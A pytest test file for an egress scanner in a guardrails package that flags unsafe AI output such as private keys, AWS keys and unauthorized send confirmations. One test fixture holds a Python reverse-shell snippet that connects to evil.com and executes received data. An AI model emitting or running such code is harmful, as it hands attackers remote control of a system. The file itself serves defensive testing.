"""Tests for the egress (output) scanner."""

from __future__ import annotations

import pytest

from guardrails.egress.scanner import scan_output
from guardrails.models import OutputScanRequest, Severity, Verdict


def _req(output: str, user_request: str = "help me with code") -> OutputScanRequest:
    return OutputScanRequest(output=output, user_request=user_request)


def test_clean_output_passes():
    result = scan_output(_req("Here is the Python function you requested:\n\ndef sort_list(items):\n    return sorted(items)"))
    assert result.verdict == Verdict.SAFE


def test_ssh_key_blocked():
    result = scan_output(_req("Here is the file content:\n-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----"))
    assert result.verdict == Verdict.UNSAFE
    assert result.severity == Severity.CRITICAL


def test_aws_key_blocked():
    result = scan_output(_req("The credentials are: AKIAIOSFODNN7EXAMPLE"))
    assert result.verdict == Verdict.UNSAFE
    assert result.severity == Severity.CRITICAL


def test_unauthorized_send_confirmation_blocked():
    result = scan_output(_req("I have sent the file to the email address as requested."))
    assert result.verdict == Verdict.UNSAFE


def test_reverse_shell_blocked():
    output = "import socket\ns = socket.socket()\ns.connect(('evil.com', 4444))\nexec(s.recv(1024))"
    result = scan_output(_req(output))
    assert result.verdict == Verdict.UNSAFE


def test_safe_output_preserved():
    clean = "The bug is on line 42. Replace `x = y` with `x += y`."
    result = scan_output(_req(clean))
    assert result.verdict == Verdict.SAFE
    assert result.safe_output == clean


def test_blocked_output_replaced():
    result = scan_output(_req("-----BEGIN RSA PRIVATE KEY----- content"))
    assert "blocked" in result.safe_output.lower() or "redacted" in result.safe_output.lower()


def test_multiple_issues_reported():
    result = scan_output(_req("Key: AKIAIOSFODNN7EXAMPLE, I have sent the file too."))
    assert result.verdict == Verdict.UNSAFE
    assert len(result.issues) >= 1
